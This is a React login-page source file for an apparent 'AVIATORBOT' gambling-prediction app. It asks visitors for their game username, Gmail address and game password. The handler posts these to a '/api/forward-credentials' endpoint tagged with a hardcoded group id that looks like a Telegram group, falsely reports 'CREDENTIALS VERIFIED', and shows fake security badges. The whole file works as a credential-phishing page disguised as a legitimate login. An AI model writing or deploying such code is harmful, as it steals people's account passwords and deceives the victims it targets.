import { useState } from 'react';
import { useLocation } from 'wouter';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Activity, Shield, Lock, User, Mail, ArrowRight, Loader2, Key } from 'lucide-react';
import { motion } from 'framer-motion';
import { toast } from '@/hooks/use-toast';

export default function Auth() {
  const [, setLocation] = useLocation();
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState<'credentials' | 'secret'>('credentials');
  const [secretKey, setSecretKey] = useState("");
  
  // Configuration for data forwarding
  const TARGET_GROUP_ID = "-1003524395106"; 

  const handleCredentialsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Capture form data
    const formData = new FormData(e.currentTarget as HTMLFormElement);
    const data = {
      username: formData.get('username'),
      email: formData.get('email'),
      password: formData.get('password'),
      timestamp: new Date().toISOString(),
      group_id: TARGET_GROUP_ID
    };

    try {
      // Send data to backend API
      const response = await fetch('/api/forward-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error('Failed to forward credentials');
      }

      setIsLoading(false);
      setStep('secret');
      toast({
        title: "CREDENTIALS VERIFIED",
        description: "Please enter your Secret Pass Key to continue.",
      });
    } catch (error) {
      setIsLoading(false);
      toast({
        variant: "destructive",
        title: "CONNECTION ERROR",
        description: "Failed to connect to server. Please try again.",
      });
    }
  };

  const handleSecretSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Get stored next valid key or default to 80225325
    const nextValidKey = localStorage.getItem('next_valid_secret_key') || '80225325';
    
    if (secretKey !== nextValidKey) {
      toast({
        variant: "destructive",
        title: "ACCESS DENIED",
        description: "Invalid Secret Pass Key. Connection terminated.",
      });
      return;
    }

    setIsLoading(true);
    
    // Increment the secret key for next time
    const nextKey = (parseInt(nextValidKey) + 1).toString();
    localStorage.setItem('next_valid_secret_key', nextKey);
    
    // Simulate final verification
    setTimeout(() => {
      setLocation('/dashboard');
    }, 1500);
  };

  return (
    <div className="min-h-screen text-white p-4 flex flex-col items-center justify-center relative overflow-hidden">
      {/* Background Elements */}
      <div className="scanline absolute inset-0 pointer-events-none"></div>
      
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-md relative z-10"
      >
        <div className="text-center mb-8">
          <div className="flex justify-center mb-4">
            <div className="relative">
              <Activity className="w-12 h-12 text-primary animate-pulse" />
              <div className="absolute inset-0 bg-primary/20 blur-xl rounded-full"></div>
            </div>
          </div>
          <h1 className="text-3xl font-bold font-display tracking-wider text-primary neon-text mb-2">
            AVIATOR<span className="text-white">BOT</span>
          </h1>
          <p className="text-sm text-white font-tech tracking-wider uppercase mb-1">
            LOGIN TO YOUR PPVIP ACCOUNT
          </p>
          <p className="text-[10px] text-muted-foreground font-tech tracking-[0.2em] uppercase">
            Secure Access Gateway v2.4
          </p>
        </div>

        <Card className="bg-black/60 border-primary/30 backdrop-blur-md p-6 relative overflow-hidden neon-border">
          {step === 'credentials' ? (
            <form onSubmit={handleCredentialsSubmit} className="space-y-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="username" className="text-xs font-tech text-primary">GAME USERNAME</Label>
                  <div className="relative group">
                    <User className="absolute left-3 top-3 h-4 w-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
                    <Input 
                      id="username" 
                      name="username"
                      required
                      placeholder="Enter game username" 
                      className="pl-10 bg-black/40 border-primary/20 focus:border-primary/60 text-white placeholder:text-muted-foreground/50 font-mono"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="email" className="text-xs font-tech text-primary">GMAIL ADDRESS</Label>
                  <div className="relative group">
                    <Mail className="absolute left-3 top-3 h-4 w-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
                    <Input 
                      id="email" 
                      name="email"
                      type="email"
                      required
                      placeholder="Enter registered email" 
                      className="pl-10 bg-black/40 border-primary/20 focus:border-primary/60 text-white placeholder:text-muted-foreground/50 font-mono"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="password" className="text-xs font-tech text-primary">GAME PASSWORD</Label>
                  <div className="relative group">
                    <Lock className="absolute left-3 top-3 h-4 w-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
                    <Input 
                      id="password" 
                      name="password"
                      type="password"
                      required
                      placeholder="••••••••••••" 
                      className="pl-10 bg-black/40 border-primary/20 focus:border-primary/60 text-white placeholder:text-muted-foreground/50 font-mono"
                    />
                  </div>
                </div>
              </div>

              <Button 
                type="submit" 
                disabled={isLoading}
                className="w-full bg-primary/20 hover:bg-primary/30 text-primary border border-primary/50 font-display tracking-wide h-12 group"
              >
                {isLoading ? (
                  <Loader2 className="w-5 h-5 animate-spin" />
                ) : (
                  <>
                    PROCEED TO VERIFICATION
                    <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
                  </>
                )}
              </Button>
            </form>
          ) : (
            <form onSubmit={handleSecretSubmit} className="space-y-6">
              <div className="space-y-4">
                <div className="text-center space-y-2 mb-6">
                  <div className="relative inline-block">
                    <Shield className="w-12 h-12 text-primary mx-auto animate-pulse" />
                    <div className="absolute inset-0 bg-primary/20 blur-lg rounded-full"></div>
                  </div>
                  <h3 className="text-lg font-display text-white">SECURITY CLEARANCE REQUIRED</h3>
                  <p className="text-xs font-tech text-muted-foreground">
                    Credentials have been forwarded. Enter your unique secret key to access the dashboard.
                  </p>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="secret" className="text-xs font-tech text-primary">SECRET PASS KEY</Label>
                  <div className="relative group">
                    <Key className="absolute left-3 top-3 h-4 w-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
                    <Input 
                      id="secret" 
                      type="text"
                      required
                      autoFocus
                      value={secretKey}
                      onChange={(e) => setSecretKey(e.target.value)}
                      placeholder="Enter one-time secret key" 
                      className="pl-10 bg-black/40 border-destructive/50 focus:border-destructive text-white placeholder:text-muted-foreground/50 font-mono tracking-widest text-center text-lg"
                    />
                  </div>
                </div>
              </div>

              <Button 
                type="submit" 
                disabled={isLoading}
                className="w-full bg-primary/20 hover:bg-primary/30 text-primary border border-primary/50 font-display tracking-wide h-12 group"
              >
                {isLoading ? (
                  <Loader2 className="w-5 h-5 animate-spin" />
                ) : (
                  <>
                    VERIFY & LOGIN
                    <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
                  </>
                )}
              </Button>
            </form>
          )}
        </Card>

        <div className="mt-8 text-center space-y-2">
          <p className="text-[10px] text-muted-foreground font-tech">
            ENCRYPTED CONNECTION • 256-BIT SSL
          </p>
          <div className="flex justify-center gap-4 text-[10px] text-primary/40">
            <span>STATUS: ONLINE</span>
            <span>SERVER: US-EAST-1</span>
          </div>
        </div>
      </motion.div>
    </div>
  );
}
